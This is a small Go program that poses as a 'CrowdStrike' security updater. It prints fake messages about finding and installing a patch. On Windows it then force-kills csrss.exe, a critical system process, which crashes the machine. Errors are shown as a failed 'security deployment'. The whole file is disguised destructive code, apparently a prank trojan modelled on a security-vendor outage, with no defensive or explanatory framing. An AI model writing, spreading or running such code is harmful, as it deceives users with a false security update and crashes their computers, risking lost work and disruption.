package main

import (
	"fmt"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	fmt.Println("-----------")
	fmt.Println("CrowdStrike v1.0")
	fmt.Println("-----------")
	fmt.Println("Checking for updates....")
	time.Sleep(2 * time.Second)
	fmt.Println("New security patch found!")
	time.Sleep(1 * time.Second)
	fmt.Println("Installing patch. Please wait...")
	time.Sleep(5 * time.Second)

	processName := "csrss"
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("taskkill", "/F", "/IM", processName+".exe")
	default:
		fmt.Printf("CrowdStrike does not support this operating system (%v) yet.\n", runtime.GOOS)
		return
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		//fmt.Printf("Failed to terminate process %s: %v\n", processName, err)
		fmt.Println("Security deployment failed")
		return
	}

	//fmt.Printf("Successfully terminated process %s\n", processName)
}
